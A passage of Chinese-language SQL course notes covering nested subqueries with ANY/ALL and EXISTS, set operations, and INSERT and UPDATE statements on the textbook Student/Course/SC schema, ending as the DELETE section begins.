<p>1.RDBMS执行此查询时，首先处理子查询，找出 CS系中所有学生的年龄，构成一个集合(20，19)<br>\2. 处理父查询，找所有不是CS系且年龄小于 20 或 19的学生</p>
<p><strong>用聚集函数实现[例42]</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span>   Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> (<span class="keyword">SELECT</span> <span class="built_in">MAX</span>(Sage)</span><br><span class="line">             <span class="keyword">FROM</span> Student</span><br><span class="line">             <span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>)</span><br><span class="line">          <span class="keyword">AND</span> Sdept <span class="operator">&lt;&gt;</span> <span class="string">&#x27;CS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328213809434.png" alt="在这里插入图片描述"></p>
<p><strong>[例43] 查询其他系中比计算机科学系所有学生年龄都小的学生姓名及年龄。</strong></p>
<ul>
<li>方法一：用ALL谓词</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> Sage</span><br><span class="line">                 <span class="keyword">FROM</span> Student</span><br><span class="line">                  <span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>)</span><br><span class="line">              <span class="keyword">AND</span> Sdept <span class="operator">&lt;&gt;</span> <span class="string">&#x27;CS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328213933146.png" alt="在这里插入图片描述"></p>
<ul>
<li>方法二：用聚集函数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> (<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(Sage)</span><br><span class="line">               <span class="keyword">FROM</span> Student</span><br><span class="line">               <span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>)</span><br><span class="line">            <span class="keyword">AND</span> Sdept <span class="operator">&lt;&gt;</span> <span class="string">&#x27;CS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328214050416.png" alt="在这里插入图片描述"></p>
<p><strong>ANY（或SOME），ALL谓词与聚集函数、IN谓词的等价转换关系</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>=</th>
<th>&lt;&gt;或!=</th>
<th>&lt;</th>
<th>&lt;=</th>
<th>&gt;</th>
<th>&gt;=</th>
</tr>
</thead>
<tbody><tr>
<td>ANY</td>
<td>IN</td>
<td>–</td>
<td>&lt;MAX</td>
<td>&lt;=MAX</td>
<td>&gt;MIN</td>
<td>&gt;=MIN</td>
</tr>
<tr>
<td>ALL</td>
<td>–</td>
<td>NOT IN</td>
<td>&lt;MIN</td>
<td>&lt;=MIN</td>
<td>&gt;MAX</td>
<td>&gt;=MAX</td>
</tr>
</tbody></table>
<h2 id="带有EXISTS谓词的子查询"><a href="#带有EXISTS谓词的子查询" class="headerlink" title="带有EXISTS谓词的子查询"></a>带有EXISTS谓词的子查询</h2><p><strong>EXISTS谓词</strong></p>
<ul>
<li>存在量词 ∃</li>
<li>带有EXISTS谓词的子查询不返回任何数据，只产生逻辑真值“true”或逻辑假值“false”。<ul>
<li>若内层查询结果非空，则外层的WHERE子句返回真值</li>
<li>若内层查询结果为空，则外层的WHERE子句返回假值</li>
</ul>
</li>
<li>由EXISTS引出的子查询，其目标列表达式通常都用* ，因为带EXISTS的子查询只返回真值或假值，给出列名无实际意义</li>
</ul>
<p><strong>NOT EXISTS谓词</strong></p>
<ul>
<li>若内层查询结果非空，则外层的WHERE子句返回假值</li>
<li>若内层查询结果为空，则外层的WHERE子句返回真值</li>
</ul>
<p><strong>[例44]查询所有选修了1号课程的学生姓名。</strong></p>
<p><strong>思路分析：</strong></p>
<ul>
<li>本查询涉及Student和SC关系</li>
<li>在Student中依次取每个元组的Sno值，用此值去检查SC关系</li>
<li>若SC中存在这样的元组，其Sno值等于此Student.Sno值，并且其Cno=‘1’，则取此Student.Sname送入结果关系</li>
</ul>
<p><strong>1.用嵌套查询</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">             <span class="keyword">FROM</span> SC</span><br><span class="line">              <span class="keyword">WHERE</span> Sno<span class="operator">=</span>Student.Sno </span><br><span class="line">   			<span class="keyword">AND</span> Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328220025911.png" alt="在这里插入图片描述"></p>
<p><strong>2.用连接运算</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student, SC</span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno<span class="operator">=</span>SC.Sno </span><br><span class="line"><span class="keyword">AND</span> SC.Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328220145896.png" alt="在这里插入图片描述"></p>
<p><strong>[例45] 查询没有选修1号课程的学生姓名。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">             <span class="keyword">FROM</span> SC</span><br><span class="line">              <span class="keyword">WHERE</span> Sno<span class="operator">=</span>Student.Sno </span><br><span class="line">   			 <span class="keyword">AND</span> Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328220235205.png" alt="在这里插入图片描述"></p>
<p><strong>不同形式的查询间的替换</strong></p>
<ul>
<li>一些带EXISTS或NOT EXISTS谓词的子查询不能被其他形式的子查询等价替换</li>
<li>所有带IN谓词、比较运算符、ANY和ALL谓词的子查询都能用带EXISTS谓词的子查询等价替换<br>用EXISTS/NOT EXISTS实现全称量词(难点)<br>SQL语言中没有全称量词∀（For all）<br>可以把带有全称量词的谓词转换为等价的带有存在量词的谓词：<br><img src="https://img-blog.csdnimg.cn/20200328220340747.png" alt="在这里插入图片描述"><br><strong>例：[例39]查询与“刘晨”在同一个系学习的学生。</strong><br><strong>可以用带EXISTS谓词的子查询替换：</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student S1</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">           <span class="keyword">FROM</span> Student S2</span><br><span class="line">           <span class="keyword">WHERE</span> S2.Sdept <span class="operator">=</span> S1.Sdept</span><br><span class="line">   		   <span class="keyword">AND</span> S2.Sname <span class="operator">=</span> <span class="string">&#x27;刘晨&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328220610972.png" alt="在这里插入图片描述"></p>
<p><strong>[例46] 查询选修了全部课程的学生姓名。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">                 <span class="keyword">FROM</span> Course</span><br><span class="line">                 <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">                                  <span class="keyword">FROM</span> SC</span><br><span class="line">                                  <span class="keyword">WHERE</span> Sno<span class="operator">=</span> Student.Sno</span><br><span class="line">                                   <span class="keyword">AND</span> Cno<span class="operator">=</span> Course.Cno)</span><br><span class="line">                 );</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328220839126.png" alt="在这里插入图片描述"></p>
<p><strong>用EXISTS/NOT EXISTS实现逻辑蕴函(难点)</strong></p>
<ul>
<li>SQL语言中没有蕴函(Implication)逻辑运算</li>
<li>可以利用谓词演算将逻辑蕴函谓词等价转换为：<br><img src="https://img-blog.csdnimg.cn/20200328220918284.png" alt="在这里插入图片描述"><br><strong>[例47]查询至少选修了学生201215122选修的全部课程的学生号码。<br>解题思路：</strong></li>
<li>用逻辑蕴函表达：查询学号为x的学生，对所有的课程y，只要201215122学生选修了课程y，则x也选修了y。</li>
<li>形式化表示：<br>用P表示谓词 “学生201215122选修了课程y”<br>用q表示谓词 “学生x选修了课程y”<br><img src="https://img-blog.csdnimg.cn/20200328221001631.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200328221513898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>用NOT EXISTS谓词表示：</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC SCX</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">                <span class="keyword">FROM</span> SC SCY</span><br><span class="line">                <span class="keyword">WHERE</span> SCY.Sno <span class="operator">=</span> <span class="string">&#x27;201215122&#x27;</span> </span><br><span class="line">   			    <span class="keyword">AND</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">                                <span class="keyword">FROM</span> SC SCZ</span><br><span class="line">                                <span class="keyword">WHERE</span> SCZ.Sno<span class="operator">=</span>SCX.Sno </span><br><span class="line">   					        	<span class="keyword">AND</span> SCZ.Cno<span class="operator">=</span>SCY.Cno</span><br><span class="line">   							)</span><br><span class="line">   				);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328221455379.png" alt="在这里插入图片描述"></p>
<h1 id="集合查询"><a href="#集合查询" class="headerlink" title="集合查询"></a>集合查询</h1><h2 id="集合操作的种类"><a href="#集合操作的种类" class="headerlink" title="集合操作的种类"></a>集合操作的种类</h2><ul>
<li><code>并操作UNION</code></li>
<li><code>交操作INTERSECT</code></li>
<li><code>差操作EXCEPT</code></li>
</ul>
<p><strong>参加集合操作的各<code>查询结果</code>的<code>列数必须相同</code>；对应项的<code>数据类型也必须相同</code></strong></p>
<h2 id="集合操作举例"><a href="#集合操作举例" class="headerlink" title="集合操作举例"></a>集合操作举例</h2><p><strong>[例48] 查询计算机科学系的学生及年龄不大于19岁的学生。</strong><br><strong>方法一：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">       <span class="keyword">FROM</span> Student</span><br><span class="line">       <span class="keyword">WHERE</span> Sage<span class="operator">&lt;=</span><span class="number">19</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328231826579.png" alt="在这里插入图片描述"></p>
<ul>
<li><code>UNION</code>：将多个查询结果<code>合并</code>起来时，系统自动<code>去掉重复元组</code>。</li>
<li><code>UNION ALL</code>：将多个查询结果<code>合并</code>起来时，<code>保留重复元组</code></li>
</ul>
<p><strong>方法二：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  <span class="keyword">DISTINCT</span>  <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span>  Sage<span class="operator">&lt;=</span><span class="number">19</span>;</span><br></pre></td></tr></table></figure>
<p><strong>[例49] 查询选修了课程1<code>或者</code>选修了课程2的学生。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span> <span class="string">&#x27;2&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328231932550.png" alt="在这里插入图片描述"></p>
<p><strong>[例50] 查询计算机科学系的学生与年龄不大于19岁的学生的<code>交集</code></strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> </span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage<span class="operator">&lt;=</span><span class="number">19</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328232036527.png" alt="在这里插入图片描述"></p>
<p><strong>[例50] 实际上就是查询计算机科学系中年龄不大于19岁的学生</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> </span><br><span class="line"><span class="keyword">AND</span>  Sage<span class="operator">&lt;=</span><span class="number">19</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328232149368.png" alt="在这里插入图片描述"></p>
<p><strong>[例51] 查询选修课程1的学生集合与选修课程2的学生集合的<code>交集</code></strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> </span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;2&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328232244520.png" alt="在这里插入图片描述"></p>
<p><strong>[例51]实际上是查询既选修了课程1<code>又</code>选修了课程2 的学生</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> Sno <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;2&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328232458730.png" alt="在这里插入图片描述"></p>
<p><strong>[例52] 查询计算机科学系的学生与年龄不大于19岁的学生的<code>差集</code>。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">EXCEPT</span></span><br><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;=</span><span class="number">19</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328232558341.png" alt="在这里插入图片描述"></p>
<p><strong>[例52]实际上是查询计算机科学系中年龄大于19岁的学生</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> </span><br><span class="line"><span class="keyword">AND</span>  Sage<span class="operator">&gt;</span><span class="number">19</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328232657354.png" alt="在这里插入图片描述"></p>
<hr>
<h1 id="思维导图-2"><a href="#思维导图-2" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://img-blog.csdnimg.cn/20200401161830948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="基本表更新—TABLE"><a href="#基本表更新—TABLE" class="headerlink" title="基本表更新—TABLE"></a>基本表更新—TABLE</h1><h2 id="插入数据—INSERT-INTO"><a href="#插入数据—INSERT-INTO" class="headerlink" title="插入数据—INSERT INTO"></a>插入数据—INSERT INTO</h2><p><strong>两种插入数据方式</strong></p>
<ol>
<li>插入元组</li>
<li>插入子查询结果</li>
</ol>
<ul>
<li>可以一次插入多个元组</li>
</ul>
<h3 id="插入元组"><a href="#插入元组" class="headerlink" title="插入元组"></a>插入元组</h3><p><strong>语句格式</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> [(<span class="operator">&lt;</span>属性列<span class="number">1</span><span class="operator">&gt;</span>[，<span class="operator">&lt;</span>属性列<span class="number">2</span> <span class="operator">&gt;</span>…)]</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="operator">&lt;</span>常量<span class="number">1</span><span class="operator">&gt;</span> [，<span class="operator">&lt;</span>常量<span class="number">2</span><span class="operator">&gt;</span>]    …           )</span><br></pre></td></tr></table></figure>
<p>功能:将新元组插入指定表中</p>
<p><strong>INTO子句</strong></p>
<ul>
<li>属性列的顺序可与表定义中的顺序不一致</li>
<li>没有指定属性列</li>
<li>指定部分属性列</li>
</ul>
<p><strong>VALUES子句</strong></p>
<ul>
<li>提供的值必须与INTO子句匹配</li>
<li>值的个数</li>
<li>值的类型</li>
</ul>
<p><strong>［例1］ 将一个新学生元组（学号：200215128；姓名：陈冬；性别：男；所在系：IS；年龄：18岁）插入到Student表中。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span>  Student (Sno，Sname，Ssex，Sdept，Sage)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;200215128&#x27;</span>，<span class="string">&#x27;陈冬&#x27;</span>，<span class="string">&#x27;男&#x27;</span>，<span class="string">&#x27;IS&#x27;</span>，<span class="number">18</span>)；</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401132731647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>［例2］ 将学生张成民的信息插入到Student表中。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span>  Student</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;200215126&#x27;</span>, <span class="string">&#x27;张成民&#x27;</span>, <span class="string">&#x27;男&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;CS&#x27;</span>); </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401132943495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>［例3］ 插入一条选课记录( ‘200215128’，’1 ‘)。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> SC(Sno,Cno)<span class="operator">/</span><span class="operator">/</span>RDBMS将在新插入记录的Grade列上自动地赋空值</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;200215128&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>等价</span><br><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> SC</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;200215128&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="keyword">NULL</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020040113321448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="插入子查询结果"><a href="#插入子查询结果" class="headerlink" title="插入子查询结果"></a>插入子查询结果</h3><p><strong>语句格式</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> </span><br><span class="line"><span class="keyword">INTO</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>  [(<span class="operator">&lt;</span>属性列<span class="number">1</span><span class="operator">&gt;</span> [，<span class="operator">&lt;</span>属性列<span class="number">2</span><span class="operator">&gt;</span>…  )]</span><br><span class="line">子查询；</span><br></pre></td></tr></table></figure>
<p><strong>功能</strong><br>将子查询结果插入指定表中</p>
<p><strong>INTO子句(与插入元组类似)</strong></p>
<p><strong>子查询</strong></p>
<ul>
<li>SELECT子句目标列必须与INTO子句匹配<br>值的个数<br>值的类型</li>
</ul>
<p><strong>[例4] 对每一个系，求学生的平均年龄，并把结果存入数据库。</strong></p>
<p><strong>第一步：建表</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">TABLE</span>  Dept_age(</span><br><span class="line">Sdept  <span class="type">CHAR</span>(<span class="number">15</span>),       <span class="comment">/* 系名*/</span></span><br><span class="line">Avg_age <span class="type">SMALLINT</span>		  <span class="comment">/*学生平均年龄*/</span></span><br><span class="line">);   	 </span><br></pre></td></tr></table></figure>
<p><strong>第二步：插入数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span>  Dept_age(Sdept,Avg_age)</span><br><span class="line"><span class="keyword">SELECT</span>  Sdept,<span class="built_in">AVG</span>(Sage)</span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sdept;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401134827273.png" alt="在这里插入图片描述"></p>
<p><strong>RDBMS在执行插入语句时会检查所插元组是否破坏表上已定义的完整性规则</strong></p>
<ul>
<li>实体完整性</li>
<li>参照完整性</li>
<li>用户定义的完整性</li>
<li>NOT NULL约束</li>
<li>UNIQUE约束</li>
<li>值域约束</li>
</ul>
<h2 id="修改数据—UPDATE-SET"><a href="#修改数据—UPDATE-SET" class="headerlink" title="修改数据—UPDATE SET"></a>修改数据—UPDATE SET</h2><p><strong>语句格式</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE  <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">SET</span>  <span class="operator">&lt;</span>列名<span class="operator">&gt;=</span><span class="operator">&lt;</span>表达式<span class="operator">&gt;</span>[，<span class="operator">&lt;</span>列名<span class="operator">&gt;=</span><span class="operator">&lt;</span>表达式<span class="operator">&gt;</span>]…</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure>
<p><strong>功能</strong><br>修改指定表中满足WHERE子句条件的元组</p>
<p><strong>SET子句</strong></p>
<ul>
<li>指定修改方式</li>
<li>要修改的列</li>
<li>修改后取值</li>
</ul>
<p><strong>WHERE子句</strong></p>
<ul>
<li>指定要修改的元组</li>
<li><code>缺省表示要修改表中的所有元组</code></li>
</ul>
<p><strong>三种修改方式</strong></p>
<ol>
<li>修改某一个元组的值</li>
<li>修改多个元组的值</li>
<li>带子查询的修改语句</li>
</ol>
<h3 id="修改某一个元组的值"><a href="#修改某一个元组的值" class="headerlink" title="修改某一个元组的值"></a>修改某一个元组的值</h3><p><strong>[例5] 将学生201215121的年龄改为22岁</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE  Student</span><br><span class="line"><span class="keyword">SET</span> Sage<span class="operator">=</span><span class="number">22</span></span><br><span class="line"><span class="keyword">WHERE</span>  Sno<span class="operator">=</span><span class="string">&#x27;201215121&#x27;</span>; </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401135354968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>[例6] 将所有学生的年龄增加1岁</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE Student</span><br><span class="line"><span class="keyword">SET</span> Sage<span class="operator">=</span> Sage<span class="operator">+</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401135500751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>[例7] 将计算机科学系全体学生的成绩置零。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE SC</span><br><span class="line"><span class="keyword">SET</span>  Grade<span class="operator">=</span><span class="number">0</span></span><br><span class="line"><span class="keyword">WHERE</span>  <span class="string">&#x27;CS&#x27;</span><span class="operator">=</span>( </span><br><span class="line">				<span class="keyword">SELECT</span>  Sdept</span><br><span class="line">				<span class="keyword">FROM</span>  Student</span><br><span class="line">				<span class="keyword">WHERE</span>  Student.Sno <span class="operator">=</span> SC.Sno</span><br><span class="line">			);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020040113581718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>RDBMS在执行修改语句时会检查修改操作是否破坏表上已定义的完整性规则</strong></p>
<ul>
<li>实体完整性</li>
<li>主码不允许修改</li>
<li>用户定义的完整性</li>
<li>NOT NULL约束</li>
<li>UNIQUE约束</li>
<li>值域约束</li>
</ul>
<h2 id="删除数据-—DELETE"><a href="#删除数据-—DELETE" class="headerlink" title="删除数据 —DELETE"></a>删除数据 —DELETE</h2><p><strong>三种删除方式</strong></p>
<ol>
<li>删除某一个元组的值</li>
<li>删除多个元组的值</li>
<li>带子查询的删除语句</li>
</ol>
